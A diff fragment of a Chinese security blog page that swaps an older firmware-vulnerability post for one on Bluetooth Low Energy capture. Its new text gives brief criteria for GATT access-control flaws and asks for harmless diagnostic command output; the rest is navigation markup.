+<li>未配对或未授权就能读写敏感 GATT 特征值：访问控制缺陷。</li>
+<li>已配对、加密且每次敏感写入都有授权：日志中即使存在控制协议，也不应直接判定漏洞。</li>
+</ul>
+<p>需要进入下一步时，请提供以下<strong>非敏感输出</strong>：<code>adb shell id</code>、<code>getprop ro.build.version.release</code>、两个日志路径命令的结果，以及车机开发者选项里是否有 HCI snoop 开关。我可以据此给出对应的导出路径和 Wireshark 过滤顺序。</p>
 
                     
                 </div>
@@ -521,7 +432,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/IOT/">IOT</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE/">蓝牙协议</a>
                                     </li>
                                 
                             </ul>
@@ -576,14 +487,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2026/07/25/linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"
-                                   title="Linux提权学习"
+                                   href="/2026/08/16/wifi%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8/"
+                                   title="wifi渗透入门"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">Linux提权学习</span>
+                                        <span class="post-nav-title-item text-ellipsis">wifi渗透入门</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
                                 </a>
@@ -593,11 +504,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2026/05/04/D-Link%20DCS-935L%E5%9B%BA%E4%BB%B6%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
-                                   title="D-Link DCS-935L固件栈溢出漏洞分析"
+                                   href="/2026/07/25/linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"
+                                   title="Linux提权学习"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">D-Link DCS-935L固件栈溢出漏洞分析</span>
+                                        <span class="post-nav-title-item text-ellipsis">Linux提权学习</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -726,7 +637,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="nav-text">环境模拟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB"><span class="nav-text">模拟攻击</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BLE-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">BLE 是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BLE%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="nav-text">BLE通信流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8C%85"><span class="nav-text">抓包</span></a></li></ol>
     </div>
 </div>
 
@@ -913,7 +824,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="nav-text">环境模拟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB"><span class="nav-text">模拟攻击</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BLE-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">BLE 是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BLE%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="nav-text">BLE通信流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8C%85"><span class="nav-text">抓包</span></a></li></ol>
     </div>
 </div>
 
